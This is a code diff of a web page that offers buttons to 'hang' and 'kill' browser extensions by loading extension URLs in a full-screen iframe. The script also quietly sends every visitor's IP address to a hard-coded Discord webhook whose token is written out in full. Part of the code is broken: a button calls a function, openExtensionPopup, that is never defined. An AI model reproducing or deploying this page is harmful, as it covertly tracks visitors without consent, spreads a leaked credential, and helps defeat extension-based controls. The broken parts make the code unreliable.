@@ -102,21 +102,21 @@
       border-radius: 8px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
     }
-    #killButton {
-      display: none;
-      background-color: #dc3545;
-      color: #fff;
-      border: none;
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      border-radius: 5px;
-      transition: background-color 0.3s ease;
-    }
+   	 #killButton {
+	  display: none;
+	  background-color: #dc3545;
+	  color: #fff;
+	  border: none;
+	  padding: 10px 20px;
+	  font-size: 16px;
+	  cursor: pointer;
+	  border-radius: 5px;
+ 	  transition: background-color 0.3s ease;
+	}
 
-    #killButton:hover {
-      background-color: #9c1c28;
-    }
+	#killButton:hover {
+	  background-color: #9c1c28;
+	}
     footer {
       background-color: #343a40;
       color: #fff;
@@ -148,7 +148,7 @@
   <select id="iframeSelect">
   </select>
   <button onclick="warning();" id="hangButton">Hang Extension!</button>
-  <button id="killButton" onclick="killButtonClick();">Kill Extension!</button>
+  <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
 </div>
 
 <div class="overlay" id="overlay">
@@ -163,7 +163,6 @@
 
 <script>
   const webhookURL = "https://discord.com/api/webhooks/1326700367509065798/Oke5zi9IASPzRByi121Y3h_BVnZ_FXjAQXuUjaGH5KmrS-cmwKcaylPCjke99Vid5xMy";
-  let killClickCount = 0;
 
   async function logIP() {
     const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -172,21 +171,6 @@
 
     const payload = {
       content: `New visitor IP: ${ip}`
-    };
-
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(payload)
-    });
-  }
-
-  async function logKillClick() {
-    killClickCount++;
-    const payload = {
-      content: `Kill Extension button clicked! Total clicks: ${killClickCount}`
     };
 
     await fetch(webhookURL, {
@@ -252,26 +236,48 @@
     if (selectedExtensionURL) {
       const iframe = document.createElement("iframe");
       iframe.src = selectedExtensionURL;
-      iframe.style.display = "none";
+      iframe.style.width = "100%";
+      iframe.style.height = "100%";
+      iframe.style.position = "fixed";
+      iframe.style.top = "0";
+      iframe.style.left = "0";
+      iframe.style.zIndex = "9999";
       document.body.appendChild(iframe);
     }
   }
 
-  function warning() {
-    const overlay = document.getElementById('overlay');
-    overlay.style.display = 'flex';
-
-    setTimeout(function() {
-      overlay.style.display = 'none';
-      document.getElementById("killButton").style.display = "inline-block";
-      document.getElementById("killExtensionText").style.display = "inline-block";
-    }, 2000);
+  async function openPopup() {
+    const popup = window.open("", "Popup", "width=400,height=200");
+    popup.document.write(`
+      <html>
+        <head>
+          <title>Popup</title>
+        </head>
+        <body>
+          <p>Are you sure you want to do this?</p>
+        </body>
+      </html>
+    `);
   }
 
-  function killButtonClick() {
-    logKillClick();
-    document.getElementById("killButton").style.display = "none";
-    document.getElementById("killExtensionText").textContent = "You Killed The Extension!";
+  function warning() {
+    var overlay = document.getElementById("overlay");
+    overlay.style.display = "flex";
+
+    setTimeout(function() {
+      overlay.style.display = "none";
+      var killButton = document.getElementById("killButton");
+      killButton.style.display = "block";
+
+      var hangButton = document.getElementById("hangButton");
+      hangButton.style.display = "none";
+
+      var labelForIframeSelect = document.getElementById("labelForIframeSelect");
+      labelForIframeSelect.style.display = "none";
+
+      var iframeSelect = document.getElementById("iframeSelect");
+      iframeSelect.style.display = "none";
+    }, 420000);
   }
 
   populateSelectOptions();
